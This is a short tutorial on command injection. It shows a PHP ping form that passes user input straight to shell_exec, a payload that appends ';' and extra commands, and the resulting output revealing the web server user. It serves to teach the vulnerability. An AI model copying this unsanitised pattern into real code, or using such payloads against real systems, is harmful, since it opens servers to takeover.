Command injection occurs when application gets and input from outside and execute that as system command.

# Vulnerable Code 1
This simple code will get a POST request with ip parameter and execute it with "shell_exec" command. Normally it intended to ping to an ip adress. 

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

## Abusing

If we end command with ";" character (on linux) and add another system command, both of them will be executed and result will be reflected to user.

## Payload

```bash
127.0.0.1; whoami; id
```

## Result

```bash
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.033 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.045 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.046 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.042 ms
--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.033/0.042/0.046/0.000 ms
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
